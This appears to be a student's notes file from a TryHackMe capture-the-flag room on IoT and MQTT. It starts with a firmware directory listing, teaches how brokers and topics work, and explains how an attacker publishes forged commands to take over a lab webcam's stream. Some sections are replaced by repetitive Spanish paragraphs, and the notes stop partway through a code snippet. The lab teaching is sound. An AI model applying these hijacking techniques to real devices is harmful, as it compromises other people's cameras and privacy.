+drwxr-xr-x  2 root root 4.0K Apr  6  2016 rc.d
+lrwxrwxrwx  1 root root   18 Dec 22 04:42 resolv.conf -> ../tmp/resolv.conf
+-rwxr-xr-x  1 root root  124 Apr  6  2016 securetty
+-rwxr-xr-x  1 root root 5.8K Apr  6  2016 services
+-rwxr-xr-x  1 root root   59 Apr  6  2016 shadow
+drwxr-xr-x  3 root root 4.0K Apr  6  2016 wlan
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 wpa2
+-rwxr-xr-x  1 root root 9.5K Apr  6  2016 wr941n.ico
+
+lib:
+total 1.1M
+drwxr-xr-x  5 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+-rwxr-xr-x  1 root root  21K Apr  6  2016 ld-uClibc-0.9.30.so
+lrwxrwxrwx  1 root root   19 Dec 22 04:42 ld-uClibc.so.0 -> ld-uClibc-0.9.30.so
+lrwxrwxrwx  1 root root   19 Dec 22 04:42 libc.so.0 -> libuClibc-0.9.30.so
+-rw-r--r--  1 root root  10K Apr  6  2016 libcrypt-0.9.30.so
+lrwxrwxrwx  1 root root   18 Dec 22 04:42 libcrypt.so.0 -> libcrypt-0.9.30.so
+-rw-r--r--  1 root root 8.2K Apr  6  2016 libdl-0.9.30.so
+lrwxrwxrwx  1 root root   15 Dec 22 04:42 libdl.so.0 -> libdl-0.9.30.so
+drwxr-xr-x  3 root root 4.0K Apr  6  2016 libexec
+lrwxrwxrwx  1 root root   13 Dec 22 04:42 libgcc_s.so -> libgcc_s.so.1
+-rw-r--r--  1 root root 171K Apr  6  2016 libgcc_s.so.1
+lrwxrwxrwx  1 root root   17 Dec 22 04:42 libip4tc.so -> libip4tc.so.0.0.0
+lrwxrwxrwx  1 root root   17 Dec 22 04:42 libip4tc.so.0 -> libip4tc.so.0.0.0
+-rwxr-xr-x  1 root root  24K Apr  6  2016 libip4tc.so.0.0.0
+lrwxrwxrwx  1 root root   17 Dec 22 04:42 libip6tc.so -> libip6tc.so.0.0.0
+lrwxrwxrwx  1 root root   17 Dec 22 04:42 libip6tc.so.0 -> libip6tc.so.0.0.0
+-rwxr-xr-x  1 root root  25K Apr  6  2016 libip6tc.so.0.0.0
+lrwxrwxrwx  1 root root   16 Dec 22 04:42 libiptc.so -> libiptc.so.0.0.0
+lrwxrwxrwx  1 root root   16 Dec 22 04:42 libiptc.so.0 -> libiptc.so.0.0.0
+-rwxr-xr-x  1 root root 2.1K Apr  6  2016 libiptc.so.0.0.0
+lrwxrwxrwx  1 root root   11 Dec 22 04:42 libiw.so -> libiw.so.29
+-rwxr-xr-x  1 root root  30K Apr  6  2016 libiw.so.29
+-rw-r--r--  1 root root  99K Apr  6  2016 libm-0.9.30.so
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 libm.so -> libm-0.9.30.so
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 libm.so.0 -> libm-0.9.30.so
+-rwxr-xr-x  1 root root 3.1K Apr  6  2016 libmsglog.so
+-rw-r--r--  1 root root  917 Apr  6  2016 libnsl-0.9.30.so
+lrwxrwxrwx  1 root root   16 Dec 22 04:42 libnsl.so -> libnsl-0.9.30.so
+lrwxrwxrwx  1 root root   16 Dec 22 04:42 libnsl.so.0 -> libnsl-0.9.30.so
+-rw-r--r--  1 root root  70K Apr  6  2016 libpthread-0.9.30.so
+lrwxrwxrwx  1 root root   20 Dec 22 04:42 libpthread.so -> libpthread-0.9.30.so
+lrwxrwxrwx  1 root root   20 Dec 22 04:42 libpthread.so.0 -> libpthread-0.9.30.so
+-rw-r--r--  1 root root  917 Apr  6  2016 libresolv-0.9.30.so
+lrwxrwxrwx  1 root root   19 Dec 22 04:42 libresolv.so -> libresolv-0.9.30.so
+lrwxrwxrwx  1 root root   19 Dec 22 04:42 libresolv.so.0 -> libresolv-0.9.30.so
+-rw-r--r--  1 root root 3.4K Apr  6  2016 librt-0.9.30.so
+lrwxrwxrwx  1 root root   15 Dec 22 04:42 librt.so -> librt-0.9.30.so
+lrwxrwxrwx  1 root root   15 Dec 22 04:42 librt.so.0 -> librt-0.9.30.so
+-rw-r--r--  1 root root 376K Apr  6  2016 libuClibc-0.9.30.so
+-rw-r--r--  1 root root 3.9K Apr  6  2016 libutil-0.9.30.so
+lrwxrwxrwx  1 root root   17 Dec 22 04:42 libutil.so.0 -> libutil-0.9.30.so
+-rwxr-xr-x  1 root root 144K Apr  6  2016 libwpa_common.so
+-rwxr-xr-x  1 root root 7.9K Apr  6  2016 libwpa_ctrl.so
+lrwxrwxrwx  1 root root   19 Dec 22 04:42 libxtables.so -> libxtables.so.2.1.0
+lrwxrwxrwx  1 root root   19 Dec 22 04:42 libxtables.so.2 -> libxtables.so.2.1.0
+-rwxr-xr-x  1 root root  25K Apr  6  2016 libxtables.so.2.1.0
+drwxr-xr-x  3 root root 4.0K Apr  6  2016 modules
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 pkgconfig
+
+mnt:
+total 8.0K
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+
+proc:
+total 8.0K
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+
+root:
+total 8.0K
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+
+sbin:
+total 1016K
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 brctl -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 getty -> ../bin/busybox
+-rwxr-xr-x  1 root root 375K Apr  6  2016 hostapd
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 ifconfig -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 init -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 insmod -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 iptables -> iptables-multi
+-rwxr-xr-x  1 root root  62K Apr  6  2016 iptables-multi
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 iptables-restore -> iptables-multi
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 iptables-save -> iptables-multi
+-rwxr-xr-x  1 root root  28K Apr  6  2016 iwconfig
+-rwxr-xr-x  1 root root  34K Apr  6  2016 iwlist
+-rwxr-xr-x  1 root root  15K Apr  6  2016 iwpriv
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 klogd -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 logread -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 lsmod -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 reboot -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 rmmod -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 route -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 syslogd -> ../bin/busybox
+-rwxr-xr-x  1 root root 163K Apr  6  2016 tc
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 udhcpc -> ../bin/busybox
+lrwxrwxrwx  1 root root   14 Dec 22 04:42 vconfig -> ../bin/busybox
+-rwxr-xr-x  1 root root  42K Apr  6  2016 wifitool
+-rwxr-xr-x  1 root root  21K Apr  6  2016 wlanconfig
+-rwxr-xr-x  1 root root 255K Apr  6  2016 wpa_supplicant
+
+sys:
+total 8.0K
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+
+tmp:
+total 8.0K
+drwxrwxrwt  2 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+
+usr:
+total 48K
+drwxr-xr-x  4 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+-rwxr-xr-x  1 root root  24K Apr  6  2016 arp
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 bin
+-rwxr-xr-x  1 root root 4.2K Apr  6  2016 net_ioctl
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 sbin
+
+var:
+total 12K
+drwxr-xr-x  3 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 run
+
+web:
+total 40K
+drwxr-xr-x 10 root root 4.0K Apr  6  2016 .
+drwxr-xr-x 16 root root 4.0K Dec  1 05:42 ..
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 dynaform
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 frames
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 help
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 images
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 localiztion
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 login
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 oem
+drwxr-xr-x  2 root root 4.0K Apr  6  2016 userRpm
+```
+*2.6.31*
+Did you know we have a wonderful community [on Discord](https://discord.gg/tryhackme)? If you join us there, you can count on nice conversation, cyber security tips & tricks, and room help from our mods and mentors. Our Discord admin has some rooms out, too - you can try an [easy one](https://tryhackme.com/room/githappens) or a [hard one](https://tryhackme.com/room/shaker)!
+### [Day 21] MQTT Have yourself a merry little webcam
+﻿                        The Story
+Check out Alh4zr3d's video walkthrough for Day 21 [here](https://youtu.be/sqVKpAHZu9s)!
+After investigating the web camera implant through hardware and firmware reverse engineering, you are tasked with identifying and exploiting any known vulnerabilities in the web camera. Elf Mcskidy is confident you won't be able to compromise the web camera as it seems to be up-to-date, but we will investigate if off-the-shelf exploits are even needed to take back control of the workshop.
+Learning Objectives
+-   Explain the Internet of Things, why it is important, and if we should be concerned about their danger.
+-   Understand the difference between an IoT-specific protocol and other network service protocols.
+-   Understand what a publish/subscribe model is and how it interacts with IoT devices.
+-   Analyze and exploit the behavior of a vulnerable IoT device.
+What is the Internet of Things
+The **I**nternet **o**f **T**hings (**IoT**) defines a categorization of just that, “things”. Devices are interconnected and rely heavily on communication to achieve a device’s objectives. Examples of IoT include thermostats, web cameras, and smart fridges, to name only a few.
+While the formal definition of IoT may change depending on who is setting it, the term can best be used as a broad categorization of “a device that sends and receives data to communicate with other devices and systems.”
+If IoT defines such an extensive categorization of devices with varying capabilities and objectives, what makes them important or warrants that we study them? While several justifiable reasons exist to study IoT, we will address three possible answers.
+First, IoT categorizes unique devices, e.g., smart fridges, that don't match other categories, such as mobile devices. IoT devices tend to be lightweight, which means that the device's functionality and features are limited to only essentials. Because of their lightweight nature, modern features may be left out or overlooked, one of the most concerning being security. While we live in a modern era of security, it may still be considered secondary, which is why it is not included in core functionality.
+Second, devices are interconnected and often involve no human interaction. Think of authentication in which a human uses a password for security; these devices must not only be designed to communicate data effectively but also negotiate a secure means of communication such that human interaction is not required, e.g., using a password.
+Third, devices are designed to all be interconnected, so if _device a_ is using _x protocol_ and _device b_ is using _y protocol_, it presents a significant problem in compatibility. The same concept can be applied to security where devices are incompatible but could fall back to insecure communication.
+Remember, security is often thought of as secondary, so not ensuring a device can securely communicate with other devices may be a fatal weakness that is overlooked or deemed less important.
+In the next section, we will cover how IoT protocols function and study examples of how devices may or may not address the flaws proposed above.
+Introduction to IoT Protocols
+An "IoT protocol" categorizes any protocol used by an IoT device for **machine-to-machine**, **machine-to-gateway**, or **machine-to-cloud** communication. As previously defined, an IoT device sends and receives data to communicate with other devices and systems; with this in mind, an IoT protocol's objective should be _efficient_, _reliable_, and _secure_ data communication.
+We can break up IoT protocols into one of two types, an **IoT data protocol** or an **IoT network protocol**. These types may be deceiving in their name as both are used to communicate data. How they differentiate is how and where the communication occurs. At a glance, an IoT data protocol commonly relies on the **TCP/IP** (**T**ransmission **C**ontrol **P**rotocol/**I**nternet **P**rotocol) model, and an IoT network protocol relies on wireless technology for communication. We will continue expanding the purpose of these protocol types below.
+Hypertext Transfer Protocol (HTTP) is the protocol that specifies how a web browser and a web server communicate. Your web browser requests content from the TryHackMe web server using the HTTP protocol as you go through this room.
+Let's break down an IoT data protocol into concepts that may be more familiar to us. An IoT data protocol is akin to common network services you may use or interact with daily, such as HTTP, SMB, FTP, and others. In fact, HTTP can be used as the backbone for other IoT protocols or as an IoT data protocol itself.
+An IoT network or wireless protocol still maintains the same goals as data protocols, that is, data communication, but it achieves it differently. Rather than relying on traditional TCP protocols, these protocols use wireless technology such as Wi-Fi, Bluetooth, ZigBee, and Z-Wave to transfer data and communicate between entities.
+ZigBee es un estándar de comunicación inalámbrica que se utiliza principalmente para la automatización del hogar y la industria. Fue diseñado para proporcionar una solución de bajo consumo de energía y de bajo costo para la comunicación entre dispositivos de Internet de las cosas (IoT, por sus siglas en inglés).
+ZigBee utiliza una red de malla, lo que significa que cada dispositivo ZigBee puede actuar como un repetidor y transmitir señales a otros dispositivos, lo que permite que la red tenga un alcance mayor y sea más resistente a fallos. Además, ZigBee tiene una alta tasa de confiabilidad y seguridad, ya que utiliza cifrado de datos y autenticación para proteger la privacidad de los datos transmitidos.
+ZigBee se utiliza principalmente en aplicaciones de automatización del hogar, como el control de luces y enchufes inteligentes, pero también se utiliza en aplicaciones industriales, como el monitoreo de la calidad del aire y el control de procesos industriales. Gracias a su bajo consumo de energía y su alta confiabilidad, ZigBee se ha convertido en una opción popular para la conectividad IoT en una amplia variedad de aplicaciones.
+Bluetooth es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos electrónicos a corta distancia. Se utiliza principalmente para conectar dispositivos móviles, como teléfonos móviles y tabletas, con auriculares, altavoces y otros dispositivos, como teclados y ratones.
+Bluetooth utiliza una frecuencia de radio de 2,4 GHz y puede transmitir datos a una distancia de hasta 10 metros. Es una opción de bajo consumo de energía y es muy fácil de usar, ya que no requiere cables ni configuración especial. Además, Bluetooth es compatible con una amplia variedad de dispositivos y sistemas operativos, lo que lo hace muy conveniente para la conectividad entre dispositivos.
+En resumen, Bluetooth es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos electrónicos a corta distancia de manera sencilla y eficiente. Se utiliza principalmente para conectar dispositivos móviles con otros dispositivos, como auriculares y altavoces, y es compatible con una amplia variedad de dispositivos y sistemas operativos.
+Wi-Fi es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos a Internet y a redes locales. Es una opción muy popular para la conexión a Internet en hogares y lugares de trabajo y se utiliza en una amplia variedad de dispositivos, incluyendo computadoras, teléfonos móviles, tabletas y televisores inteligentes.
+Wi-Fi utiliza una frecuencia de radio de 2,4 GHz o 5 GHz y puede transmitir datos a una velocidad muy alta, lo que lo hace ideal para la conexión a Internet y el intercambio de datos entre dispositivos. Para conectarse a una red Wi-Fi, los dispositivos necesitan estar cerca de un router o punto de acceso que proporcione la conexión a Internet. Una vez que los dispositivos están conectados a la red, pueden comunicarse entre sí y acceder a Internet de manera rápida y sencilla.
+En resumen, Wi-Fi es un estándar de comunicación inalámbrica que se utiliza para conectar dispositivos a Internet y a redes locales de manera rápida y eficiente. Se utiliza en una amplia variedad de dispositivos y es una opción muy popular para la conexión a Internet en hogares y lugares de trabajo.
+Middleware es un software que actúa como intermediario entre diferentes sistemas y aplicaciones, permitiendo que se comuniquen y compartan datos de manera más eficiente. El middleware es una capa intermedia entre el sistema operativo y las aplicaciones, y se utiliza para integrar diferentes sistemas y hacer que trabajen juntos de manera más fluida.
+Por ejemplo, si una empresa tiene diferentes sistemas que utilizan bases de datos diferentes, el middleware puede ser utilizado para permitir que estos sistemas compartan datos y se integren de manera más sencilla. El middleware puede proporcionar una interfaz común para que los diferentes sistemas accedan a los datos y puede realizar tareas como la traducción de los datos de un formato a otro para que puedan ser utilizados por los diferentes sistemas.
+En resumen, el middleware es un software que actúa como intermediario entre diferentes sistemas y aplicaciones, permitiendo que se comuniquen y compartan datos de manera más eficiente y haciendo que trabajen juntos de manera más fluida. Se utiliza para integrar diferentes sistemas y proporcionar una interfaz común para el acceso a los datos.
+Throughout this task, we will focus on the former category of protocols and how they interact with IoT devices.
+So then, let's dive deeper into IoT data protocols and what makes them… well, a data protocol.
+Messaging Protocols and Middleware
+Because data communication is the primary objective of IoT data protocols, they commonly take the form of a **messaging protocol**; that is, the protocol facilities the **sending** and **receiving** of a **message** or **payload** between two parties.
+Messaging protocols communicate between two devices through an independent server (”**middleware**”) or by negotiating a communication method amongst themselves.
+Devices commonly use middleware because they must be lightweight and efficient; for example, an IoT device may not support a more robust protocol, such as HTTP. A server is placed in the middle of two clients who want to communicate to translate the communication method to a means both devices can understand, given their technology.
+Recall how we mentioned that the combability of device protocols could be a problem; middleware fixes some of the associated issues but may still be unable to translate all communications.
+Below is a brief synopsis of popular messaging protocols used by IoT devices.
+MQTT (Message Queueing Telemetry Transport) es un protocolo de mensajería en tiempo real diseñado para la comunicación entre dispositivos de Internet de las cosas (IoT, por sus siglas en inglés). MQTT se utiliza para permitir que los dispositivos IoT envíen y reciban mensajes de manera rápida y eficiente, incluso en entornos con conexiones de red inestables o de baja velocidad.
+Un ejemplo sencillo de cómo se puede utilizar MQTT podría ser en un hogar con dispositivos inteligentes, como termostatos y luces inteligentes. Un termostato inteligente podría utilizar MQTT para enviar mensajes a las luces inteligentes para que se apaguen o se encendan cuando la temperatura en el hogar alcance ciertos niveles. De esta manera, el termostato y las luces pueden trabajar juntos de manera automática para ahorrar energía y mejorar el confort de los habitantes del hogar.
+En resumen, MQTT es un protocolo de mensajería en tiempo real diseñado para la comunicación entre dispositivos de Internet de las cosas. Se utiliza para permitir que los dispositivos IoT envíen y reciban mensajes de manera rápida y eficiente, incluso en entornos con conexiones de red inestables o de baja velocidad.
+WebSocket es un protocolo de red que se utiliza para establecer una conexión bidireccional y en tiempo real entre un cliente y un servidor a través de una conexión web. Esto permite que los clientes y servidores intercambien datos de manera asíncrona sin tener que realizar solicitudes HTTP continuas, lo que reduce la carga de red y mejora la eficiencia.
+WebSocket se utiliza principalmente en aplicaciones que requieren una comunicación en tiempo real, como juegos en línea, aplicaciones de mensajería y aplicaciones de monitoreo en tiempo real. Por ejemplo, una aplicación de mensajería podría utilizar WebSocket para permitir que los usuarios envíen y reciban mensajes en tiempo real sin tener que esperar a que se realice una solicitud HTTP cada vez que se envía o recibe un mensaje.
+En resumen, WebSocket es un protocolo de red que se utiliza para establecer una conexión bidireccional y en tiempo real entre un cliente y un servidor a través de una conexión web. Se utiliza principalmente en aplicaciones que requieren una comunicación en tiempo real y mejora la eficiencia al permitir que los clientes y servidores intercambien datos de manera asíncrona sin tener que realizar solicitudes HTTP continuas.
+El modelo cliente-servidor es un enfoque para la arquitectura de red que se utiliza para permitir que los clientes accedan y utilicen los servicios y los recursos de un servidor. En este modelo, el servidor es un equipo o un programa que proporciona servicios y recursos a los clientes, mientras que los clientes son equipos o programas que utilizan esos servicios y recursos.
+Por ejemplo, cuando se accede a un sitio web a través de un navegador, el navegador actúa como el cliente y el servidor web proporciona el contenido del sitio web. El navegador envía una solicitud al servidor web y el servidor web envía de vuelta el contenido del sitio web para que el navegador lo muestre al usuario.
+El modelo cliente-servidor es muy utilizado en la red y se utiliza en una amplia variedad de aplicaciones, como el correo electrónico, el acceso a bases de datos y el almacenamiento en la nube. Gracias a su flexibilidad y escalabilidad, el modelo cliente-servidor se ha convertido en una opción popular para la arquitectura de red en muchas organizaciones.
+El modelo de publicación/suscripción es un enfoque para la comunicación entre dispositivos y sistemas que se utiliza para permitir que los dispositivos envíen y reciban mensajes de manera asíncrona. En este modelo, los dispositivos pueden publicar mensajes a una cola de mensajes o un tópico específico y otros dispositivos pueden suscribirse a ese tópico para recibir los mensajes publicados.
+Por ejemplo, en un sistema de monitoreo de energía, un sensor podría publicar mensajes con información sobre el consumo de energía a un tópico específico y una aplicación de monitoreo podría suscribirse a ese tópico para recibir y procesar la información del sensor. De esta manera, el sensor y la aplicación de monitoreo pueden trabajar juntos de manera asíncrona y sin necesidad de una conexión directa.
+En resumen, el modelo de publicación/suscripción es un enfoque para la comunicación entre dispositivos y sistemas que se utiliza para permitir que los dispositivos envíen y reciban mensajes de manera asíncrona. Los dispositivos pueden publicar mensajes a una cola de mensajes o un tópico específico y otros dispositivos pueden suscribirse a ese tópico para recibir los mensajes publicados.
+**Protocol
+**
+**Communication Method
+**
+**Description**
+MQTT (Message Queuing Telemetry Transport)
+Middleware
+A lightweight protocol that relies on a publish/subscribe model to send or receive messages.
+CoAP (Constrained Application Protocol)
+Middleware
+Translates HTTP communication to a usable communication medium for lightweight devices.
+AMQP (Advanced Message Queuing Protocol)
+Middleware
+Acts as a transactional protocol to receive, queue, and store messages/payloads between devices.
+DDS (Data Distribution Service
+Middleware
+A scalable protocol that relies on a publish/subscribe model to send or receive messages.
+HTTP (Hypertext Transfer Protocol)
+Device-to-Device
+Used as a communication method from traditional devices to lightweight devices or for large data communication.
+WebSocket
+Device-to-Device
+Relies on a client-server model to send data over a TCP connection.
+We will continue diving deeper into the MQTT protocol and potentially related security issues throughout this task.
+### Functionality of a Publish/Subscribe Model
+Messaging protocols commonly use a **publish/subscribe model**, notably the **MQTT protocol**. The model relies on a broker to negotiate **"published" messages** and **"subscription" queries**. Let's first look at a diagram of this process and then break it down further.
+Based on the above diagram,
+1.  A publisher sends their message to a broker.
+2.  The broker continues relaying the message until a new message is published.
+3.  A subscriber can attempt to connect to a broker and receive a message.
+The protocol should work fantastically if a single broker is needed for one device's objective, but what if several types of data need to be sent from one device or several publishers and subscribers need to connect to one broker? Using more than one broker can be feasible but increases unnecessary overhead and server usage.
+A secure communication method should also ensure the integrity of messages, meaning one publisher should not overwrite another.
+To address these problems, a broker can store multiple messages from different publishers by using **topics**. A topic is a semi-arbitrary value pre-negotiated by the publisher and subscriber and sent along with a message. The format of a topic commonly takes the form of `<name>/<id>/<function>`. When a new message is sent with a given topic, the broker will store or overwrite it under the topic and relay it to subscribers who have "subscribed" to it.
+Below is a diagram showing two publishers sending different messages associated with topics.
+Below is a diagram of several subscribers receiving messages from separate topics of a broker.
+Note the _asynchronous_ nature of this communication; the publisher can publish at any time, and the subscriber can subscribe to a topic to see if the broker relaid messages. Typically, subscribers and publishers will continue attempting to connect to the broker for a specific duration.
+Well, we should now understand the functionality of this model, but why would an IoT device use it?
+A publish/subscribe model is helpful for any data maintained asynchronously or received by several different devices from one publisher.
+A common example of a publish/subscribe model could be a thermostat publishing its current temperature. Several thermostats can publish to one broker, and several devices can subscribe to the thermostat they want data from.
+As a protocol specifically, MQTT is also lightweight, with a small footprint and minimal bandwidth.
+### Are IoT Protocols Inherently Vulnerable?
+We've identified the relation between IoT protocols and network services and how messaging protocols function. This still leaves the question of how secure IoT protocols are.
+Let's apply this to something we are more familiar with, HTTP. "HTTP vulnerabilities" often refer to a vulnerability in the software/application built off the protocol; this does not mean protocols are absent of vulnerabilities, but they generally possess strict requirements and require revisions before release or public adoption.
+Similarly, IoT protocols are not inherently vulnerable, so what makes an IoT device insecure?
+Before giving a more formal explanation, let's consider the default settings of MQTT when it is first deployed. An MQTT broker assigns all devices connected to it read/write access to all topics; that is, any device can publish and subscribe to a topic. We may be okay with this idea at first; in the thermostat example, we are only communicating temperatures, so the integrity of the data should not be an issue. But let's dive into this issue more.
+Our data should follow CIA (Confidentiality, Integrity, and Availability) best practices as closely as possible; that is, data should not be read or manipulated by unauthorized sources and should be accessible to authorized users. Following best practices, authentication and authorization should be implemented to prevent potentially bad actors from compromising any principle of the CIA triad.
+What is the risk to IoT devices if best practices are not considered? Risk is almost solely dependent on the behavior of a device. Let's say a device trusts an MQTT publisher and parses data or commands to perform actions affecting the device's settings. An attacker could send a malicious message to perform unintended actions. For example, a thermostat sends a message with a specific format to a broker, and a subscriber parses the message and changes the temperature. An attacker could send their message outside of the intended application (e.g., a mobile app) to modify the device's temperature. Although this example may seem modest, imagine the impact this could have on other devices with consequences or critical devices, which are essential to the function of a society and/or economy.
+To recap, an MQTT instance may be insecure due to improper data regulation best practices. An instance may be vulnerable if the device's behavior allows an attacker to perform malicious actions from expected interaction.
+Note the differentiation between insecure and vulnerable; an insecure implementation may allow an attacker to exploit a vulnerability, but this does not mean the implementation is inherently vulnerable.
+In the next task, we will expand this idea and attempt to identify methods we can use to identify the behavior of a given device.
+### Abusing Device Behavior
+Before moving on to the hands-on section, let's address how we can identify information about device behavior.
+We've defined that IoT devices are vulnerable because of their applications' behavior. Now let's briefly look at how we can analyze a device's behavior for vulnerable entry points and how they can be abused.
+An attacker can discover device behavior from communication sniffing, source code analysis, or documentation.
+-   **Communication sniffing** can determine the protocol used, the middleware or broker address, and the communication behavior. For example, unencrypted HTTP requests are sent to a central server, which are then translated to CoAP packets. We can observe the HTTP packets and look for topics or message formats that vendors should hide, e.g. settings, commands, etc., to interact with the device.
+-   **Source code analysis** can give you direct insight into how a device parses sent data and how it is being used. Analysis can identify similar information to communication sniffing but may act as a more reliable and definite source of information.
+-   **Documentation** provides you with a clear understanding of the standard functionality of a device or endpoint. A disadvantage of only using documentation as a means of identification is that it may leave out sensitive payloads, topics, or other information that is not ordinarily relevant to an end user that we, as attackers want.
+Once a behavior is identified, we can use clients to interact with devices and send malicious messages/payloads.
+To cement this concept, let's go back to the thermostat example and see how an attacker may attempt to control the device.
+Most IoT devices have a device ID that they use to identify themselves to other devices and that other devices can use to identify the target device. Devices must exchange this device ID before any other communication can occur. In the case of MQTT, a device ID is commonly exchanged by publishing a message containing the device ID to a pre-known topic that anyone can subscribe to.
+Once an attacker knows the device ID and behavior of a target device they can attempt to target specific topics or message formats. These topics may trust the message source and perform some action blindly (e.g. change a temperature, change a publishing destination, etc.)
+In our scenario, preliminary information has been identified by Recon McRed through hardware analysis and firmware reverse engineering. The web camera device is known to use the MQTT protocol, and we have a list of potential topics we can target. Before analyzing these potentially vulnerable topics, let's look at how we may interact with an MQTT endpoint normally.
+Interacting with MQTT
+How do we interact with MQTT or other IoT protocols? Different protocols will have different libraries or other means of interacting with them. For MQTT, there are two commonly used libraries we will discuss, that is, **Paho** and **Mosquitto**. Paho is a python library that offers support for all features of MQTT. Mosquitto is a suite of MQTT utilities that include a broker and publish/subscribe clients that we can use from the command line.
+In this task, we will introduce the Mosquitto clients and their functionality; in the next task, we will leverage the clients against a vulnerable device to get hands-on.
+****Subscribing to a Topic****
+We can use the [mosquitto_sub](https://mosquitto.org/man/mosquitto_sub-1.html) client utility to subscribe to an MQTT broker.
+By default, the subscription utility will connect a localhost broker and only require a topic to be defined using the `-t` or **`—topic`** flag. Below is an example of connecting to a localhost and subscribing to the topic, _device/ping_.
+`mosquitto_sub -t device/ping`
+You can also specify a remote broker using the `-h` flag. Below is an example of connecting to _example.thm_ and subscribing to the topic, _device/thm_.
+`mosquitto_sub -h example.thm -t device/thm`
+****Publishing to a Topic****
+We can use the [mosquitto_pub](https://mosquitto.org/man/mosquitto_pub-1.html) client utility to publish to an MQTT broker.
+To publish a message to a topic is nearly identical to that of the subscription client. This time, however, we need to include a `-m` or `—message` flag to denote our message/payload. Below is an example of publishing to the topic, _device/info_ on the host, _example.thm_ with the message, _"This is an example."_
+`mosquitto_pub -h example.thm -t device/info -m "This is an example"`
+For both clients, there are several notable optional flags that we will briefly mention,
+-   `-d`: Enables debug messages.
+-   `-i` or `—id`: Specifies the id to identify the client to the server.
+-   `-p` or `—port`: Specifies the port the broker is using. Defaults to port `1883`.
+-   `-u` or `—username`: Used to specify the username for authentication.
+-   `-P` or `—password`: Used to specify the password for authentication.
+-   `—url`: Used to specify username, password, host, port, and topic in one URL.
+A device using MQTT will craft messages as a means of communication authentically. As an attacker, we will attempt to portray our publishing source as a legitimate source in hopes that the other side will interact with the message as it would an authentic message to provide us with unintended behavior.
+Mosquitto es un servidor de mensajería MQTT (Message Queue Telemetry Transport) que permite a dispositivos conectados a Internet enviar y recibir datos a través de mensajes. Algunas posibles interpretaciones de "device/<id>/cmd" podrían ser:
+-   Un tópico MQTT que se utiliza para enviar comandos a un dispositivo específico. El identificador entre "<" y ">" podría ser el ID del dispositivo al que se quiere enviar el comando. Por ejemplo, si el ID del dispositivo es "123", podría utilizarse el tópico "device/123/cmd" para enviar un comando a ese dispositivo.
+-
+### Practical Application
+We have covered all of the information needed to successfully approach exploiting an insecure data communication implementation of an IoT device. Let’s try to take what we have learned and apply it to the unknown web camera identified in Santa’s Workshop.
+First, let's start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection.
+As briefly covered previously, we know the following:
+-   The device interacts with an MQTT broker to publish and subscribe to pre-defined topics.
+-   The device broker is found at `MACHINE_IP`.
+-   From firmware reverse engineering, we know that the device uses these two topics
+-   `device/init`
+-   Publishes the device ID of the current device
+-   `device/<id>/cmd`
+-   Subscribes to the device ID-specific topic to receive commands and settings.
+-   The device is known to use **RTSP** (Real Time Streaming Protocol) for input streaming.
+-   If an attacker can control where and how the RTSP stream is forwarded, they can redirect it to an RTSP server they control.
+-   The `device/<id>/cmd` topic can specify a behavior through a numeric CMD parameter and the ability to parse a key-value pair to be used to interact with the device.
+We do not yet possess how the command topic behaves or the format it is expecting the message. It is up to you to craft a malicious message to target the command topic. If you are looking for a challenge, we have provided you with a small source code snippet extracted from the device firmware that you can use to gather communication behavior from. Otherwise, we have collected the information you need with the expected format and behavior of the device.
+_Device source code snippet (click to read)_
+```python
+def subscribe(client: mqtt_client):
+    def on_message(client, userdata, msg):
+        payload = msg.payload.decode()
+        topic = msg.topic
+        print("Topic:", topic)
+        print("Payload:", payload)
+        print("Parsing payload...")
